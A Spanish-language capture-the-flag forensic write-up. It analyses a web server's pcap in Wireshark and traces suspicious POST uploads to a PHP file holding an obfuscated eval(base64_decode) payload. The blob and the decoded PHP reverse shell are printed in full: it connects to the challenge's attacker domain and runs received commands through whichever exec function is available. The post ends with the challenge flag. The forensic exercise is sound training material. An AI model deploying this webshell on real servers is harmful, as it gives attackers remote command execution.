@@ -1,0 +1,206 @@
+DESCRIPCIÓN DEL RETO
+Uno de los servidores web pertenecientes a la DMZ de la compañía HouseTargaryen ha realizado conexiones extras hacia el exterior. Se sospecha que el servidor web ha sido comprometido. Los responsables de seguridad actualmente están investigando el servidor web para tratar de buscar componentes dañinos que expliquen dichas conexiones de red (una webshell, malware, etc.).
+
+Mientras tanto, se te ha asignado la tarea de analizar uno de los pcaps con el tráfico de red dirigido al servidor web, justo antes de que se reportara el incidente.
+
+El objetivo será identificar el componente dañino para contestar a la siguiente pregunta: ¿Qué dominio está vinculado con el grupo de atacantes?
+
+dmz-webserver-100-httpID201.pcapng.gz
+
+
+Bien vallamos al lío entonces, lo primero es abrir el archivo descargado con whire shark.
+
+y analizar la información.
+
+se puede hacer uso de conversores de pcapng a pcap http://pcapng.com/ inclusive..
+
+
+
+
+En un simple vistazo rápido del archivo se observa lo siguiente:
+
+Hay pocas máquinas implicadas en el pcap
+Es todo tráfico TCP y HTTP
+Por lo tanto al ser tráfico TCP y HTTP podemos determinar que son peticiones web mayor mente y de análisis de servicios por la estructura de las cabeceras de los paquetes TCP que nos entrega wireshark. Esto último lo podéis comprobar con algunas búsquedas en internet sobre estos nombres.
+
+Selección_009
+
+bvtsonar
+
+blaze port
+
+unizeus port
+
+Con esta información ya estamos deduciendo que están realizando un scanner a nuestra infraestructura y que por esta parte no vamos a ver nada interesante, siguiente paso… pues el tráfico HTTP, a ver que es lo que sacamos en claro.
+
+Selección_010.png
+
+Aplicando el filtro http nos centramos solo en este tipo de peticiones, analicémoslo un poco más aún.
+
+Selección_012
+
+Estas son las 6 primeras tramas de request / response del filtro HTTP, en amarillo se ven las peticiones al servidor y en verde las respuestas del mismo, en este caso las 3 de ejemplo están con un 200 okey que es el estado de transacción satisfactoria entre client / server.
+
+Afinando el filtro
+Como se ve en el diagrama de transacciones de arriba (el de los colores) las peticiones usan las dos maneras posibles de transacción GET y POST, lo que significa que podemos seguir segmentado el análisis por el tráfico deseado. Comencemos con GET.
+
+http.request.method==GET
+
+Selección_013.png
+
+Esta imagen es solo el principio de las request / response del método GET, y analizando todas, lo cierto es que no se aprecia ninguna conexión sospechosa de ataque, en principio dan la impresión de un uso normal de la red, por ende, el cambio al método POST es el siguiente paso.
+
+http.request.method==POST
+
+Selección_014.png
+
+Con este nuevo filtro ya vamos viendo cosas más interesantes como uploads al servirdor y un servlet que tiene una texto en claro que indica vulnerable, vamos a analizar con Follow –> HTTP STREAM el contenido de las imágenes.
+
+image1.dump
+
+Selección_015.png
+
+El archivo es muchísimo más extenso por eso os dejo el enlace de la descarga del dump por si lo queréis revisar.
+
+Con la segunda imagen que encontramos haríamos lo mismo, pero cierto es que no hay nada extraño es estos volcados, de manera que se debe seguir analizando en wireshark.
+
+Selección_016.png
+
+Gracias al filtro que aplicamos el número de tramas ahora está muy reducido y en el último paquete se aprecia que hay otro uploader solo que esta vez es una aplicacion PHP, algo extraño dado que no es ni habitual ni común que la gente suba sus script PHP a servidores de manera que vamos a analizar el volcado FOLLOW –> HTTP STREAM
+
+php-aplication.dump
+
+Selección_017
+
+Cosa MUY sospechosa, dentro del dump de la aplicacion PHP hay una función eval(base64_decode)
+
+1
+&amp;lt;?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFbERRV2RKUTFKd1kwZEdhMXBJU1RsS00yUXpaSGsxYTJOcVFtNU5SelI1VFVSRk0weHRUbXBpYVRGcVdsaEtNRXh0VG5aaVUyTTNRMmxCWjBsRFFXdGpSemw1WkVRd05FMUVjMHRKUTBGblNVTTRjVkJFT1hkaFNFRm5USGx2Y1V4M2IyZEpRMEZuU1VOQ1FWcFlTbmxpTTBwbVkyMVdkMkl6U2pCaFZ6VnVTMFJCY0U5M2IyZEpRMEZuU1VOQ1FXTXlWakJZTTFKd1lsZFdabUpIYkhSaFdGRnZUVU5yTjBsRlFuQmFNalYyWTIxV1ptUllUbXhqYkRsb1dXMDVlV1JEWjNoTFZITm5VVWRzZFdGV09YcGFXRkZ2U2pJeGFHVkdPV3hsUjFacVpGaFNjR0l5Tldaa1IyeDBXbE5qYzAxRGF6ZERhVUZuU1VOQlowbERVbXRoV0UwNVVVZHNkV0ZXT1c1YVdGRnZTakpTY0dNeVJtbGlSMVptV201V2RWa3pVbkJpTWpWNlNubHJOME5wUVdkSlEwRm5TVWRzYlV0RFJteGlXRUl3WlZObmExcEhiSHBMVTJ3M1EybEJaMGxEUVdkSlEwRm5Ta2RTY0dONk1YZGpiVlp1V0ROS2JHTkhlR2haTWxWdlNuazVZa3hEUW1STGVUaHVURU5CYmt4RFkzTkpRMUpyWVZoTmNFOTNiMmRKUTBGblNVTkJaMGxEVW10aFdFMDVXbGhvZDJKSE9XdGFVMmR1VEVOamMwbERVbXRoV0Uxd1QzZHZaMGxEUVdkSlEwRm5TVU5TYTJGWVRUbFpXRXA1V1Zoc1ptSlhSbmRM.UTJRd1kyMXNkRXA1ZDJkS1IxSndZM2xyTjBOcFFXZEpRMEZuU1VneGJHSklUbXhsZDI5blNVTkJaMGxEUVdkSlExSnJZVmhOT1ZsWVNubFpXR3R2UzFSelMwbERRV2RKUTBGblpsRnZaMGxEUVdkSlEwRkxRMmxCWjBsRFFuQmFhV2RvV201V2RWa3pVbkJpTWpWbVdsaG9jR016VW5wTFEyUTBWVmhhTTFsVFkzQkxXSE5MU1VOQlowbERRV2RhYmxaMVdUTlNjR0l5TkdkbFJrWXlaREpGYjBwSFRYQmxkMjluU1VOQlowbERRV2RKUjJSei5ZakpLYUdKRFFXdGFSMng2VDNkdlowbERRV2RKUTBGblNVRnZaMGxEUVdkSlEwSndXbWxCYjFKclJrMVZNRlZuU1ZRd09VbElUakJqYmtKMlkzbG9lbVJJU2pCaU1uaDJaREpXZVV0R1FrbFZSamxRVlhscmMwbERaRE5oVnpSdVNVTnJjRWxJYzB0SlEwRm5TVU5CWjBsRFFXdFplakJyV1hrMGFVbEVTUzVqYUhJb05ETXBMa3BxUm1OaWFVazNRMmxCWjBsRFFXZEpTREJMU1VOQlowbERRV2RLU0d4YVZWWm9NRkJUWkhCak1UbHFXVmQ0YzFsWFNuTmFVMk0zUTJsQlowbERRV2RKUTFJeFV6Rk9hRmRZUVRsS01teDFXREpHZVdOdFJqVktlbk5MU1VOQlowbERRV2REYVVGblNVTkJaMGxIYkcxTFExSTFMbGRXUmxsa1EyZHVZek5zZW1SSFZuUktlV3hvWW0xUmFFcElWa3hWTWtaYVkwTm5ibU16Ykhwa1IxWjBTbmwzYTFwSGJIcExVMnczUTJsQlowbERRV2RKUTBGbll.qSktabU16VW1oamJsRnZTMVJ6UzBsRFFXZEpRMEZuU1VOQ2VtVllUakJhVnpCdlNrZE5jRTkzYjJkSlEwRm5TVU5CWjBsRFVuWlFWemxwV0RKa2JHUkdPV3BpTWpVd1dsYzFNR041WjNCUGQyOW5TVU5CWjBsRFFXZEpSemxwV0RKV2RWcEdPV3BpUjFab1ltbG5jRTkzYjJkSlEwRm5TVU5DT1ZwWGVIcGFVVzluU1VOQlowbERRbkJhYVdkclpWWnNVbGRJVVc5S00wSm9Zek5PTUdGSVNqRktlV3hvWW0xUmFFcElWa3hWTWtaYVkwTm5ibU5IUm5wak0xSnZZMjVWYmt4RFVtdGhXRTF3UzFoelMwbERRV2RKUTBGblNVTkNkbGxzT1hwa1IwWjVaRU5uY0U5M2IyZEpRMEZuU1VOQlowbElRbWhqTTA0d1lVaEtNVXREVW1wTFZITkxTVU5CWjBsRFFXZEpRMEZyWW5veGRsbHNPVzVhV0ZKbVdUSTVkV1JIVm5Wa1NFMXZTMVJ6UzBsRFFXZEpRMEZuU1VOQ2RsbHNPV3hpYlZKbVdUSjRiRmxYTkc5TFZITkxTVU5CWjBsRFFXZG1WMVp6WXpKVlMwbC5EUVdkSlEwRm5ZVmRaYjBwSWJGcFZWbWd3UzBOa2QySXpRbXhpYVdOd1dWYzFhMGxUVWpGVE1VNW9WMWhCYjBvelFuWmpSMVoxU25sM2ExcEhiSHBMVTJ3M1EybEJaMGxEUVdkSlEwRm5Ta2RhZDFCWVFuWmpSMVoxUzBOU2FreERaSGxLZVdzM1EybEJaMGxEUVdkSlEwRm5Ta2M0T1ZSc1ZrMVVSSE5MU1VOQlowbERRV2RKUTBKd1dtbG9jR014T1hsYVdFNTJaRm.hLYWxwVFoydGFia0Z3UzFoelMwbERRV2RKUTBGblNVTkJaMGxJWkc5aFYzaHNTME5HYlZwWE9XMUxRMUp0WTBOcmNHVjNiMmRKUTBGblNVTkJaMGxEUVdkSlEwRnJZbmswT1ZwdVNteFpWMUZ2U2tkYWQweEVSWGROYWxGd1QzZHZaMGxEUVdkSlEwRm5TVU5CWjJaUmIyZEpRMEZuU1VOQlowbElNRXRKUTBGblNVTkJaMGxEUWtGalIwNXpZak5PYkV0RFVtMWpRMnMzUTJsQlowbERRV2RKU0RGc1lraE9iRU5wUVdkSlEwRm5TVWRzYlV0RFVqVlhWa1paWkVObmJtTXlhR3hpUjNobVdsaG9iRmw1WTNCWlZ6VnJTVk5TTVZNeFRtaFhXRUZ2U2pOT2IxcFhlSE5ZTWxZMFdsZE5ia3hEVW10aFdFMXdTMWh6UzBsRFFXZEpRMEZuU1VOQmEySjZNWHBoUjFaellrWTViR1ZIVm1wTFExSnFTMVJ6UzBsRFFXZEpRMEZuWmxkV2MyTXlWVXRKUTBGblNVTkJaMkZYV1c5S1NHeGFWVlpvTUM1TFEyUjNZMjA1YWxneU9YZGFWelJ1UzFkR2RWcERSV3RrVlhSVVdWWnNkMHREWkhkamJUbHFXREk1ZDFwWE5HNU1RMUpyWVZoTmNFdFljMHRKUTBGblNVTkJaMGxEUVd0aFIwWjFXa2Q0YkZCWVFubGlNazVtWWpOQ2JHSnBaMnRaZVhob1kyNUthR1ZUYUdoamJrcG9aVk5vZDJGWVFteE1RMlI1U25scmMxbFlTbmxaV0d0dlkwZHNkMXBUZDI1a2VXTndURWRHZVdOdFJqVkxTRUp3WTBkVmMwb3pZMjVMVTJ0elNraENjR05IV.m5wTFZITkxTVU5CWjBsRFFXZEpRMC5Gcllub3hUMVpWZUUxUGQyOW5TVU5CWjBsRFFXZEpTR1J2WVZkNGJFdERSbTFhVnpsdFMwTlNkMkZZUW14ak1YTjRXRk5yY0dWM2IyZEpRMEZuU1VOQlowbERRV2RLUnpoMVVGZGFlVnBYUm10TFExSjNZVmhDYkdNeGMzaFlVM2Q0VFVSSk1FdFVjMHRKUTBGblNVTkJaMGxEUWpsRGFVRm5TVU5CWjBsRFFXZFJTRUo1WWpKT1psa3llSFpqTWxWdlNrZG9hR0p0VW5OYVUyczNRMmxCWjBsRFFXZEpTREZzWWtoT2JFTnBRV2RKUTBGblNVZHNiVXREVWpWWFZrWlpaRU5uYmxwWWFHeFplV053V1ZjMWEwbFRVakZUTVU1b1YxaEJiMG95VmpSYVYwMXVURU5TYTJGWVRYQkxXSE5MU1VOQlowbERRV2RKUTBGcllub3hhR051U21obFUyZHdUM2R2WjBsRFFXZEpRMEZuU1VkV05GcFhUVzlLUjAxelNrYzRjRTkzYjJkSlEwRm5TVU5CWjBsRFVuWlFWM0IyWVZjMGIxa3lhSGxMUkVWM1MxTjNhMko1YTNWWk1taDVTMFJGZDB0VWMwdEpRMEZuU1VOQloyWlhWbk5qTWxWTFNVTkJaMGxEUVdkbGQyOW5TVU5CWjBsRFFXZEpRMUoyVUZSQk4wTnBRV2RKUTBGblNVZ3dTMGxEUVdkSlFXOW5TVU5CWjBsRFFXZEpTRXBzWkVoV2VXSnBRV3RpZW5OTFNVTkJaMGxEUVdkbVVXOW5TVU5CWjJaUmIyZEpRMEZuU2tjMWRscHVWblZaTTAwNVNqSTFka2xIVmpSYVYwMW5XbTVXZFZrelVu.QmlNalY2U25welMwbERRV2RKUjJ4dFMwZHNlbGd5VG1oaVIzaG9XVzE0YkV0RFpHMWpNamxxWVRJNWQxcFhORzVMVjBaMVdrTkdjR0pzT1doamJrcG9aVk5uYmxwdVRuWlpNblIyWTBkV2RVcDVkMnRhUjJ4NlMxTnNOME5wUVdkSlEwRm5TVU5TZWxCVlFtMWpNamxxWVRJNWQxcFhORzlKYmxKcVkwUnZka3d6WkROa2VUVnJZMnBDYmsxSE5IbE5SRVV6VEcxT2FtSnBNV3BhV0Vvd1RHMU9kbUpUU1hOS1NFSjJZMjVSY0U5M2IyZEpRMEZuUy5VTkNNMkZIYkhOYVUyZHJXWG94YldOdFZtaGFRMmRyWTNsM2VVMUVVVFF1UzFOc04wTnBRV2RKUTBGblNVTkJaMHBIT1RGa1EwRTVTVU5qYms5M2IyZEpRMEZuU1VOQlowbEhiRzFMU0U0eFdXNU9NR05wWjJ0WmVYZDNURVJOY0VsRU1EbEpRMlJxV2tOQmJrdFljMHRKUTBGblNVTkJaMGxEUVdkSlIwNXZXa2RzZVV0SVRqRlpiazR3WTJsbmExbDVkM3BNUXpCNFMxTnJOME5wUVdkSlEwRm5TVU5CWjJaVFFteGlTRTVzU1Vkc2JVbERhSHBrVjBwNlpFaEpiMHBIVFhOTlEzY3dTMU5CT1ZCVFFXNWpXRlp3WkVOaloyWklkMmRqTTFacFl6TlNlVXREVW1wTVJFRnpUa05yWjFCVU1HZEtNbFkwWVZoUmJrdFRRamREYVVGblNVTkJaMGxEUVdkSlEwSnBZMjFXYUdGNmMwdEpRMEZuU1VOQlowbERRamxhVjNoNldsaHpTMGxEUVdkSlEwRm5TVU5CWjBsRFVuWmtXRkU1.WlVaR01tUXlSVzlqTTFacFl6TlNlVXREVW1wTVJFRnpURlJGY0V0VWMwdEpRMEZuU1VOQlowbERRV2RKUjJ4dFMwTlNkbVJZVVRsUVZERnRXVmQ0ZWxwVGJEZERhVUZuU1VOQlowbERRV2RKUTBGblNVZGFNMk50YkRCYVUyZHJZM2wzYTJKdE9XMWtWelZxWTNsck4wTnBRV2RKUTBGblNVTkJaMGxEUVdkSlIwcDVXbGRHY2s5M2IyZEpRMEZuU1VOQlowbERRV2RtVVc5blNVTkJaMGxEUVdkSlNEQkxTVU5CWjBsRFFXZEpRMEp0WkROS2NHUkhWVzlLU0UxelNrYzVNV1JEYXpkRGFVRm5TVU5CWjBsSU1FdEpRMEZuU1VOQloxcHRUbk5pTTA1c1MwTlNla3RVYzB0SlEwRm5TVWd4YkdKSVRteGxkMjluU1VOQlowbERRV3RqZWpGQll6STVhbUV5VmpCWU1rNTVXbGRHTUZwVGFFSlNiRGxLVkd0V1ZVeEdUbEJSTUhSbVZURlNVMUpWUms1TVJrNVFWRVk1VlZFeFFYQlBkMjluU1VOQlowbERRa0ZqTWpscVlUSldNRmd5VG5aaWJUVnNXVE5SYjBwSS5UWE5LUjJ4M1dWZFNhMk5wZDJ0alJ6bDVaRU5yTjBOcFFXZEpRMEZuU1VWQ2VtSXlUbkphV0ZKbVpETktjR1JIVlc5S1NFMXpTVzVPZGxreWRHeGtSamxxWTIxV2FHUkhWV2xMVkhOTFNVTkJaMGxEUVdka01taHdZa2RWYjBwSFRUbFJTRTUyV1RKMGJHUkdPWGxhVjBaclMwTlNla3hFU1hkT1JHZHdTMWh6UzBsRFFXZEpRMEZuU1VOQmEySXpWakJKUkRCblN.ubGpOME5wUVdkSlEwRm5TVU5CWjJGWFdXOWpNMVpwWXpOU2VVdERVbXBNUkVGelRYbHJaMUJVTUdkS01rNXJTVU5qY0dWM2IyZEpRMEZuU1VOQlowbERRV2RaTW1ocllWaEpiMk16Vm1sak0xSjVTME5TYWt4RVRYTk1WRVZ3UzFSelMwbERRV2RKUTBFdVowbERRamxKUjFaell6SlZaMkZYV1dkTFNFNHhXVzVPTUdOcFoydFplWGQzVEVSUmNFbEVNRGxKUTJSNFpGZHNNRXA1UWpobVEwSjZaRmRLZW1SSVNXOUtSMDF6VFVOM01FdFRRVGxRVTBGdVdsaG9jR1JEWTNCSlNITkxTVU5CWjBsRFFXZEpRMEZuU1VkS2VWcFhSbkpQZDI5blNVTkJaMGxEUVdkSlNERnNZa2hPYkdWM2IyZEpRMEZuU1VOQlowbERRV2RLUnpreFpFUXhORlZZV2pOWlUyaDZaRmRLZW1SSVNXOUtSMDF6VFVOM2RFMVRhM0JQZDI5blNVTkJaMGxEUVdkSlEwRm5ZVmRaYjBwSE9URmtSREE1VUZkYWFHSklUbXhMV0hOTFNVTkJaMGxEUVdkSlEwRm5TVU5CWjFGSVRuWlpNblJzWkVZNU0yTnRiREJhVTJkclkzbDNhMkp0T1cxa1Z6VnFZM2xyTjBOcFFXZEpRMEZuU1VOQlowbERRV2RKUjBwNVdsZEdjazkzYjJkSlEwRm5TVU5CWjBsRFFXZG1VVzluU1VOQlowbERRV2RKU0RCTFNVTkJaMGxEUVdkSlEwSkJZekk1YW1FeVZqQllNMlI1WVZoU2JFdERVbnBNUTFKMlpGaFJjMk16VW5saVIxWjFTME5TZG1SWVVYQkxWSE5MU1VOQlowbE.RRV2RtVVc5blNVTkJaMGxEUWtGak1qbC5xWVRKV01GZ3lUbk5pTTA1c1MwTlNla3RVYzB0SlEwRm5TVWd3U3lrcE93KSk7));?&amp;gt;
+ 
+
+https://www.base64decode.org/
+
+Al pasar el código nos devuelve hasta en dos veces más un código con eval(base64_decode) que desofuscaremos de nuevo hasta obtener el texto en claro:
+
+$ipaddr=’www.dr0g0n2017.ccn-cert.com’;
+$port=80;
+/*<?php /**/
+@error_reporting(0);
+@set_time_limit(0); @ignore_user_abort(1); @ini_set(‘max_execution_time’,0);
+$dis=@ini_get(‘disable_functions’);
+if(!empty($dis)){
+$dis=preg_replace(‘/[, ]+/’, ‘,’, $dis);
+$dis=explode(‘,’, $dis);
+$dis=array_map(‘trim’, $dis);
+}else{
+$dis=array();
+}
+
+if(!function_exists(‘xQvwa’)){
+function xQvwa($c){
+global $dis;
+
+if (FALSE !== strpos(strtolower(PHP_OS), ‘win’ )) {
+$c=$c.” 27&1\n”;
+}
+$yYQXt=’is_callable’;
+$uKSaYp=’in_array’;
+
+if($yYQXt(‘system’)and!$uKSaYp(‘system’,$dis)){
+ob_start();
+system($c);
+$o=ob_get_contents();
+ob_end_clean();
+}else
+if($yYQXt(‘passthru’)and!$uKSaYp(‘passthru’,$dis)){
+ob_start();
+passthru($c);
+$o=ob_get_contents();
+ob_end_clean();
+}else
+if($yYQXt(‘popen’)and!$uKSaYp(‘popen’,$dis)){
+$fp=popen($c,’r’);
+$o=NULL;
+if(is_resource($fp)){
+while(!feof($fp)){
+$o.=fread($fp,1024);
+}
+}
+@pclose($fp);
+}else
+if($yYQXt(‘shell_exec’)and!$uKSaYp(‘shell_exec’,$dis)){
+$o=shell_exec($c);
+}else
+if($yYQXt(‘proc_open’)and!$uKSaYp(‘proc_open’,$dis)){
+$handle=proc_open($c,array(array(pipe,’r’),array(pipe,’w’),array(pipe,’w’)),$pipes);
+$o=NULL;
+while(!feof($pipes[1])){
+$o.=fread($pipes[1],1024);
+}
+@proc_close($handle);
+}else
+if($yYQXt(‘exec’)and!$uKSaYp(‘exec’,$dis)){
+$o=array();
+exec($c,$o);
+$o=join(chr(10),$o).chr(10);
+}else
+{
+$o=0;
+}
+
+return $o;
+}
+}
+$nofuncs=’no exec functions’;
+if(is_callable(‘fsockopen’)and!in_array(‘fsockopen’,$dis)){
+$s=@fsockopen(“tcp://http://www.dr0g0n2017.ccn-cert.com“,$port);
+while($c=fread($s,2048)){
+$out = ”;
+if(substr($c,0,3) == ‘cd ‘){
+chdir(substr($c,3,-1));
+} else if (substr($c,0,4) == ‘quit’ || substr($c,0,4) == ‘exit’) {
+break;
+}else{
+$out=xQvwa(substr($c,0,-1));
+if($out===false){
+fwrite($s,$nofuncs);
+break;
+}
+}
+fwrite($s,$out);
+}
+fclose($s);
+}else{
+$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+@socket_connect($s,$ipaddr,$port);
+@socket_write($s,”socket_create”);
+while($c=@socket_read($s,2048)){
+$out = ”;
+if(substr($c,0,3) == ‘cd ‘){
+chdir(substr($c,3,-1));
+} else if (substr($c,0,4) == ‘quit’ || substr($c,0,4) == ‘exit’) {
+break;
+}else{
+$out=xQvwa(substr($c,0,-1));
+if($out===false){
+@socket_write($s,$nofuncs);
+break;
+}
+}
+@socket_write($s,$out,strlen($out));
+}
+@socket_close($s);
+}
+
+ 
+
+Ya tenemos la flag de este reto
+
+
+
+
+http://www.dr0g0n2017.ccn-cert.com/
+
+se coloca desde el www hasta el .com
+
+flag{9c8f308fc7dc421b90c3e93e765bf355}
